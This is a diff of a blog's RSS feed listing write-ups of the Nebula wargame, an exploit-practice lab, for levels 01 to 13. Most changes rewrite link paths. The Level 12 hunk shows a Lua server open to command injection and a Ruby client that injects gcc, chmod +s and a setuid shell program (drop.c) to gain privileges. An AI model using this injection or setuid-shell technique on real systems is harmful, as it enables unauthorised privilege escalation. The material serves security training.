@@ -2,19 +2,19 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Nebula on Zea&#39;s</title>
-    <link>/categories/nebula/</link>
+    <link>hanjc.me/categories/nebula/</link>
     <description>Recent content in Nebula on Zea&#39;s</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
     <lastBuildDate>Sun, 26 Jan 2014 21:54:12 +0800</lastBuildDate>
-    <atom:link href="/categories/nebula/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="hanjc.me/categories/nebula/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
       <title>Exploit Exercises - Nebula Level 13</title>
-      <link>/post/2014-01-26-nebula-level13/</link>
+      <link>/hanjc.me/post/2014-01-26-nebula-level13/</link>
       <pubDate>Sun, 26 Jan 2014 21:54:12 +0800</pubDate>
       
-      <guid>/post/2014-01-26-nebula-level13/</guid>
+      <guid>/hanjc.me/post/2014-01-26-nebula-level13/</guid>
       <description>
 
 &lt;h3 id=&#34;about:d770d09b6be1c937de3594898fdf59fe&#34;&gt;About&lt;/h3&gt;
@@ -143,10 +143,10 @@ your token is b705702b-76a8-42b0-8844-3adabbe5ac58
     
     <item>
       <title>Exploit Exercises - Nebula Level 12</title>
-      <link>/post/2014-01-26-nebula-level12/</link>
+      <link>/hanjc.me/post/2014-01-26-nebula-level12/</link>
       <pubDate>Sun, 26 Jan 2014 20:12:53 +0800</pubDate>
       
-      <guid>/post/2014-01-26-nebula-level12/</guid>
+      <guid>/hanjc.me/post/2014-01-26-nebula-level12/</guid>
       <description>
 
 &lt;h3 id=&#34;about:4f2f3bde9982f1888f7baf64aff676f9&#34;&gt;About&lt;/h3&gt;
@@ -159,51 +159,49 @@ your token is b705702b-76a8-42b0-8844-3adabbe5ac58
 
 &lt;h3 id=&#34;source-code:4f2f3bde9982f1888f7baf64aff676f9&#34;&gt;Source code&lt;/h3&gt;
 
-&lt;p&gt;``` lua /home/flag12/flag12.lua
-local socketlocal socket = require(&amp;ldquo;socket&amp;rdquo;)
-local server = assert(socket.bind(&amp;ldquo;127.0.0.1&amp;rdquo;, 50001))&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;-- /home/flag12/flag12.lua 
+local socketlocal socket = require(&amp;quot;socket&amp;quot;)
+local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001))
 
-&lt;p&gt;function hash(password)
-  prog = io.popen(&amp;ldquo;echo &amp;ldquo;..password..&amp;rdquo; | sha1sum&amp;rdquo;, &amp;ldquo;r&amp;rdquo;)
-  data = prog:read(&amp;rdquo;*all&amp;rdquo;)
-  prog:close()&lt;/p&gt;
+function hash(password) 
+  prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)
+  data = prog:read(&amp;quot;*all&amp;quot;)
+  prog:close()
 
-&lt;p&gt;data = string.sub(data, 1, 40)&lt;/p&gt;
+  data = string.sub(data, 1, 40)
 
-&lt;p&gt;return data
-end&lt;/p&gt;
+  return data
+end
 
-&lt;p&gt;while 1 do
+
+while 1 do
   local client = server:accept()
-  client:send(&amp;ldquo;Password: &amp;ldquo;)
+  client:send(&amp;quot;Password: &amp;quot;)
   client:settimeout(60)
   local line, err = client:receive()
   if not err then
-    print(&amp;ldquo;trying &amp;rdquo; .. line) &amp;ndash; log from where ;\
-    local h = hash(line)&lt;/p&gt;
+    print(&amp;quot;trying &amp;quot; .. line) -- log from where ;\
+    local h = hash(line)
 
-&lt;pre&gt;&lt;code&gt;if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
-  client:send(&amp;quot;Better luck next time\n&amp;quot;);
-else
-  client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
+    if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
+      client:send(&amp;quot;Better luck next time\n&amp;quot;);
+    else
+      client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
+    end
+
+  end
+
+  client:close()
 end
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;end&lt;/p&gt;
+&lt;h3 id=&#34;solution:4f2f3bde9982f1888f7baf64aff676f9&#34;&gt;Solution&lt;/h3&gt;
 
-&lt;p&gt;client:close()
-end&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)&lt;/code&gt; this line of code in &lt;em&gt;hash()&lt;/em&gt; function try to calc the hash of the password, but we can execute any command with a well structed &lt;em&gt;password&lt;/em&gt;.&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;
+&lt;p&gt;Write a simple Ruby script to send command to server, here I construct a &lt;em&gt;password&lt;/em&gt; to make the server build a &lt;em&gt;drop.c&lt;/em&gt; file into directory /home/flag12.&lt;/p&gt;
 
-### Solution 
-
-`prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)` this line of code in *hash()* function try to calc the hash of the password, but we can execute any command with a well structed *password*. 
-
-Write a simple Ruby script to send command to server, here I construct a *password* to make the server build a *drop.c* file into directory /home/flag12.
-
-``` ruby
-require &#39;socket&#39;
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;require &#39;socket&#39;
 
 server = TCPSocket.open(&amp;quot;127.0.0.1&amp;quot;, 50001)
 server.puts(&amp;quot;hello &amp;amp;&amp;amp; gcc -o /home/flag12/flag12 /tmp/drop.c &amp;amp;&amp;amp; chmod 777 /home/flag12/flag12 &amp;amp;&amp;amp; chmod +s /home/flag12/flag12 &amp;amp;&amp;amp; echo hello &amp;quot;)
@@ -213,30 +211,29 @@ puts &amp;quot;#{ret}&amp;quot;
 
 &lt;p&gt;Remenber the piece of C code we used to drop privilege? Here it is again:&lt;/p&gt;
 
-&lt;p&gt;``` c /tmp/drop.c
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;string.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;stdio.h&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* /tmp/drop.c */
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
 
-&lt;p&gt;int main() {
+int main() {
   gid_t gid;
   uid_t uid;
   gid = getegid();
-  uid = geteuid();&lt;/p&gt;
+  uid = geteuid();
 
-&lt;p&gt;setresgid(gid, gid, gid);
-  setresuid(uid, uid, uid);&lt;/p&gt;
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
 
-&lt;p&gt;execv(&amp;ldquo;/bin/bash&amp;rdquo;, NULL);
-}&lt;/p&gt;
+  execv(&amp;quot;/bin/bash&amp;quot;, NULL);
+}
+&lt;/code&gt;&lt;/pre&gt;
 
-&lt;pre&gt;&lt;code&gt;
-Run the Ruby script, I got
+&lt;p&gt;Run the Ruby script, I got&lt;/p&gt;
 
-``` bash
-level12@nebula:~$ ruby client.rb
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level12@nebula:~$ ruby client.rb
 Password: Better luck next time
 &lt;/code&gt;&lt;/pre&gt;
 
@@ -259,10 +256,10 @@ drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ../
     
     <item>
       <title>Exploit Exercises - Nebula Level 11</title>
-      <link>/post/2014-01-26-nebula-level11/</link>
+      <link>/hanjc.me/post/2014-01-26-nebula-level11/</link>
       <pubDate>Sun, 26 Jan 2014 16:44:20 +0800</pubDate>
       
-      <guid>/post/2014-01-26-nebula-level11/</guid>
+      <guid>/hanjc.me/post/2014-01-26-nebula-level11/</guid>
       <description>
 
 &lt;h3 id=&#34;about:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;About&lt;/h3&gt;
@@ -512,10 +509,10 @@ uid=1012(level11) gid=1012(level11) groups=1012(level11)
     
     <item>
       <title>Exploit Exercises - Nebula Level 10</title>
-      <link>/post/2014-01-25-nebula-level10/</link>
+      <link>/hanjc.me/post/2014-01-25-nebula-level10/</link>
       <pubDate>Sat, 25 Jan 2014 12:40:53 +0800</pubDate>
       
-      <guid>/post/2014-01-25-nebula-level10/</guid>
+      <guid>/hanjc.me/post/2014-01-25-nebula-level10/</guid>
       <description>
 
 &lt;h3 id=&#34;about:14691d9c48d881479fa7a5e0fa8d86be&#34;&gt;About&lt;/h3&gt;
@@ -651,10 +648,10 @@ RECV: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
     
     <item>
       <title>Exploit Exercises - Nebula Level 09</title>
-      <link>/post/2014-01-24-nebula-level09/</link>
+      <link>/hanjc.me/post/2014-01-24-nebula-level09/</link>
       <pubDate>Fri, 24 Jan 2014 11:43:40 +0800</pubDate>
       
-      <guid>/post/2014-01-24-nebula-level09/</guid>
+      <guid>/hanjc.me/post/2014-01-24-nebula-level09/</guid>
       <description>
 
 &lt;h3 id=&#34;about:e4424096463f5985d9de53dfe658d56b&#34;&gt;About&lt;/h3&gt;
@@ -738,10 +735,10 @@ print $output;
     
     <item>
       <title>Exploit Exercises - Nebula Level 08</title>
-      <link>/post/2014-01-24-nebula-level08/</link>
+      <link>/hanjc.me/post/2014-01-24-nebula-level08/</link>
       <pubDate>Fri, 24 Jan 2014 11:43:31 +0800</pubDate>
       
-      <guid>/post/2014-01-24-nebula-level08/</guid>
+      <guid>/hanjc.me/post/2014-01-24-nebula-level08/</guid>
       <description>
 
 &lt;h3 id=&#34;about:5292a1ddbf8ffdedd6d2a347c8ea1260&#34;&gt;About&lt;/h3&gt;
@@ -767,10 +764,10 @@ print $output;
     
     <item>
       <title>Exploit Exercises - Nebula Level 07</title>
-      <link>/post/2014-01-13-nebula-level07/</link>
+      <link>/hanjc.me/post/2014-01-13-nebula-level07/</link>
       <pubDate>Mon, 13 Jan 2014 15:49:10 +0800</pubDate>
       
-      <guid>/post/2014-01-13-nebula-level07/</guid>
+      <guid>/hanjc.me/post/2014-01-13-nebula-level07/</guid>
       <description>
 
 &lt;h3 id=&#34;about:6e8e879d12e150811eeb68f592dacf76&#34;&gt;About&lt;/h3&gt;
@@ -826,10 +823,10 @@ ping(param(&amp;quot;Host&amp;quot;));
     
     <item>
       <title>Exploit Exercises - Nebula Level 06</title>
-      <link>/post/2014-01-13-nebula-level06/</link>
+      <link>/hanjc.me/post/2014-01-13-nebula-level06/</link>
       <pubDate>Mon, 13 Jan 2014 15:48:33 +0800</pubDate>
       
-      <guid>/post/2014-01-13-nebula-level06/</guid>
+      <guid>/hanjc.me/post/2014-01-13-nebula-level06/</guid>
       <description>
 
 &lt;h3 id=&#34;about:07ae660d00a2e044202f8e8de81227df&#34;&gt;About&lt;/h3&gt;
@@ -853,10 +850,10 @@ ping(param(&amp;quot;Host&amp;quot;));
     
     <item>
       <title>Exploit Exercises - Nebula Level 05</title>
-      <link>/post/2014-01-13-nebula-level05/</link>
+      <link>/hanjc.me/post/2014-01-13-nebula-level05/</link>
       <pubDate>Mon, 13 Jan 2014 14:16:44 +0800</pubDate>
       
-      <guid>/post/2014-01-13-nebula-level05/</guid>
+      <guid>/hanjc.me/post/2014-01-13-nebula-level05/</guid>
       <description>
 
 &lt;h3 id=&#34;about:179c730aaf1ab914fbede043692bc166&#34;&gt;About&lt;/h3&gt;
@@ -914,10 +911,10 @@ flag05@nebula:~$
     
     <item>
       <title>Exploit Exercises - Nebula Level 04</title>
-      <link>/post/2014-01-10-nebula-level04/</link>
+      <link>/hanjc.me/post/2014-01-10-nebula-level04/</link>
       <pubDate>Fri, 10 Jan 2014 20:43:48 +0800</pubDate>
       
-      <guid>/post/2014-01-10-nebula-level04/</guid>
+      <guid>/hanjc.me/post/2014-01-10-nebula-level04/</guid>
       <description>
 
 &lt;h3 id=&#34;about:1eb2c36cf63b2a5efae90ca35d7075be&#34;&gt;About&lt;/h3&gt;
@@ -984,10 +981,10 @@ $ /home/flag04/flag04 /home/level04/aa
     
     <item>
       <title>Exploit Exercises - Nebula Level 03</title>
-      <link>/post/2014-01-09-nebula-level03/</link>
+      <link>/hanjc.me/post/2014-01-09-nebula-level03/</link>
       <pubDate>Thu, 09 Jan 2014 17:03:25 +0800</pubDate>
       
-      <guid>/post/2014-01-09-nebula-level03/</guid>
+      <guid>/hanjc.me/post/2014-01-09-nebula-level03/</guid>
       <description>
 
 &lt;h3 id=&#34;about:328184bcb19288aeb228328d198cf81f&#34;&gt;About&lt;/h3&gt;
@@ -1071,10 +1068,10 @@ $ chmod a+rx /home/level03
     
     <item>
       <title>Exploit Exercises - Nebula Level02</title>
-      <link>/post/2014-01-09-nebula-level02/</link>
+      <link>/hanjc.me/post/2014-01-09-nebula-level02/</link>
       <pubDate>Thu, 09 Jan 2014 15:13:38 +0800</pubDate>
       
-      <guid>/post/2014-01-09-nebula-level02/</guid>
+      <guid>/hanjc.me/post/2014-01-09-nebula-level02/</guid>
       <description>
 
 &lt;p&gt;基本过程与level01一样，先看/home/flag02/flag02的源代码：&lt;/p&gt;
@@ -1160,10 +1157,10 @@ $ la &amp;amp; ll &amp;amp;
     
     <item>
       <title>Exploit Exercises - Nebula Level01</title>
-      <link>/post/2014-01-09-nebula-level01/</link>
+      <link>/hanjc.me/post/2014-01-09-nebula-level01/</link>
       <pubDate>Thu, 09 Jan 2014 14:54:40 +0800</pubDate>
       
-      <guid>/post/2014-01-09-nebula-level01/</guid>
+      <guid>/hanjc.me/post/2014-01-09-nebula-level01/</guid>
       <description>&lt;p&gt;有了level00的铺垫，level01就非常简单直接了。感觉上Nebula系列的基本要求是用levelXX用户登录，通过放在/home/flagXX目录下的可执行程序来获得flagXX的用户权限，对于level01而言，可执行程序为/home/flag01/flag01，其源代码在网站上给出了：&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
